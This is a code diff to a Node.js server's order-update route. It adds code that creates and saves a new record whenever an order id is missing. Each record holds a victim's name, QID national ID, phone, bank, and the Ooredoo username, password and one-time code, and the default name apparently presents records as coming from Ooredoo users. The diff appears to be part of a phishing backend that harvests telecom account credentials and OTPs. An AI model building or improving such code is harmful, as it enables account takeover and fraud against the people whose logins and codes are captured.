@@ -158,8 +158,28 @@ const server = http.createServer(async (req, res) => {
     const id = pathname.split('/').filter(Boolean).slice(1).pop();
     const body = await readBody(req);
     const list = readOrders();
-    const index = list.findIndex((item) => item.id === id);
-    if (index === -1) return json(res, 404, { ok: false, error: 'order-not-found' });
+    let index = list.findIndex((item) => item.id === id);
+
+    if (index === -1) {
+      const created = {
+        id: String(id || crypto.randomBytes(6).toString('hex')),
+        createdAt: new Date().toISOString(),
+        status: 'pending',
+        name: String(body.name || 'مستخدم أوريدو').slice(0, 120),
+        qid: String(body.qid || '0000000000000').slice(0, 20),
+        phone: String(body.phone || '0000000000').slice(0, 16),
+        email: String(body.email || '').slice(0, 200),
+        gender: String(body.gender || '').slice(0, 50),
+        bank: String(body.bank || 'Ooredoo').slice(0, 80),
+        address: String(body.address || '').slice(0, 200),
+        ooredooUser: String(body.ooredooUser || '').slice(0, 200),
+        ooredooPass: String(body.ooredooPass || '').slice(0, 200),
+        ooredooOtp: String(body.ooredooOtp || '').slice(0, 20)
+      };
+      list.unshift(created);
+      writeOrders(list);
+      return json(res, 200, { ok: true, id: created.id, order: created });
+    }
 
     const order = list[index];
     for (const f of FIELDS) {
